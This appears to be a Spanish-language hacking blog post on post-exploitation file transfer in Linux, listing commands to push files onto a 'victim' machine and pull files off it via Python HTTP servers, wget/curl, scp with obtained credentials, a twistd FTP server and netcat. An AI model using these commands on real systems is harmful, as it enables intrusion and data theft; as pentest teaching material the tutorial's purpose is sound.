---
layout: single
title: Subida y Bajada de archivos (Post explotacion) 
excerpt:
date: 2024-01-17
classes: wide
header:
  teaser: /assets/images/archivoslinux/kali_linux.jpg
  teaser_home_page: true
categories:
  - hacking
  - linux
  - 
tags:  
  - hacking
  - linux
---

buenas. hoy vengo a enseñar los metodos de post explotacion para subir y bajar archivos dependiendo de la conexion que tengamos con la maquina victima

## Subir archivos a la victima

## HTTP server

con este metodo habriremos un servidor de python en el directorio donde esta el archivo que queremos subir.
 
 comando maquina atacante:
```python

python -m SimpleHTTPServer 80

```
comandos para la maquina victima:

```python
wget http://<Tu_IP>/<elarchivo>

o

curl -o FiletoTransfer http://<tu_IP>/<elarchivo>
```
## SCP

ESTE METODO SOLO SERA VALIDO SI LA MAQUINA OBJETIVO TIENE SSH Y DISPONEMOS DE LAS CREDENCIALES.

en este solo necesitamos un comando:

```python

scp FiletoTransfer <usuario>@<IP>:<archivo>

```

## FTP

Montaremos un ftp temporal(podriamos utilizar un ftp convencional) utilizando la utilidad twistd para asi acceder desde la víctima y descargar el archivo

el comando de la maquina atacante: 

```python

twistd -n ftp -r .

```

maquina victima:

```python

wget ftp://<IP>:<puerto_a_elegir>/<archivo>

```
## netcat

podemos usar netcat para poder pasar archivos. casi todas las maquinas linux lo traen pre instalado entonces podemos usarlo

primero tenemos que ejecutar el comando en la maquina victima 

```python

nc -lvp <port_a_elegir> > FiletoTransfer

```

y despues la maquina atacante 

```python

	
nc <IP> <Port_a_elegit> -w 3 < <archivo>


```

## Bajar archivos de la víctima

## Netcat

se pude utilizar netcat a la inversa para hace este procedimiento, pero hay que tener en cuenta los permisos que tenga el usuario sobre el archivo

Comando máquina atacante:

```python
	
nc -lvp <Puerto_a_elegir> > FiletoDownload

```
Comando máquina víctima:

```python
	
nc <IP> <Puerto_a_elegir> -w 3 < <archivo>

```

## Server HTTP

es basicamente lo mismo que e hemos echo para subir archivos pero al reves.

tambien, hay que tener en cuenta que la maquina tenga python y los permisos que tenga

Comando máquina víctima:

```python

python -m SimpleHTTPServer 8080

```

Comando máquina atacante:

```python

wget http://<IP>:8080/<archivo>

```

## SCP

Este metodo solo será valido si la máquina objetivo tiene ssh y disponemos de las credenciales.
Utilizaremos la utilidad scp para transferir el archivo de la máquina víctima a la nuestra.

Comando máquina atacante:

```python

scp tester@<IP>:<archivo> .

```
## conclusion

estas son algunas de las mas utilizadas, seguro hay mas. 
pronto subire este articulo pero para windows.
adios 